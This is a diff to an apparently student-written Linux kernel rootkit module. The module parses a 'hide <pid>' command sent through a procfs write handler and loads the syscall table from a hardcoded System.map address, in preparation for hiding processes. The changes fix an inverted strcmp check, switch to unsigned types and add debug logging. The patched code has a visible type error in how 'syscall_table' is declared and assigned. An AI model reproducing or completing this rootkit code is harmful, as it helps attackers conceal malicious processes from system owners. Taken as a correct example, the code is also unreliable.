@@ -37,7 +37,7 @@ static spinlock_t lock;
 static int is_rootkit_hidden;
 
 // Syscall table pointers
-static long long *syscall_table;
+static unsigned long long syscall_table;
 
 
 // Create new process_info struct
@@ -75,16 +75,18 @@ LIST_HEAD(procList);
 */
 static int get_syscall_table(char *System_map_name){
 
-	long long *tmp = kmalloc(sizeof(long long), GFP_KERNEL);
+	unsigned long long *tmp = (unsigned long long*)kmalloc(sizeof(unsigned long long), GFP_KERNEL);
 
-	if(!kstrtoll(System_map_name, 16, tmp)){
+	if(0 == kstrtoull(System_map_name, 16, tmp)){
 
-		syscall_table = (long long*)tmp;
+		syscall_table = (unsigned long long*)tmp;
 
-		pr_info("get syscall_table_successfull");
+		pr_info("get syscall_table successfull");
 
 		return 0;	
 	}
+
+	pr_info("get syscall_table failed");
 
 	return -EINVAL;	
 }
@@ -112,7 +114,7 @@ static int parse_input(char *commands){
 	int pid;
 	
 
-	if(strcmp(commands, "hide")){
+	if(strcmp(commands, "hide") == 0){
 
 		// skip space
 		commands = strsep(&commands, " ");
@@ -128,6 +130,7 @@ static int parse_input(char *commands){
 		}
 	}
 	else{
+		pr_info("this.");
 		get_syscall_table("ffffffff81a001c0");
 	}
 
@@ -191,6 +194,8 @@ static ssize_t mp1_write(struct file *file, const char __user *buffer, size_t co
     if(copy_from_user(buf, buffer, count)){
       return -EFAULT;
     }
+
+    pr_info("%s\n", buf);
 
     parse_input(buf);
 
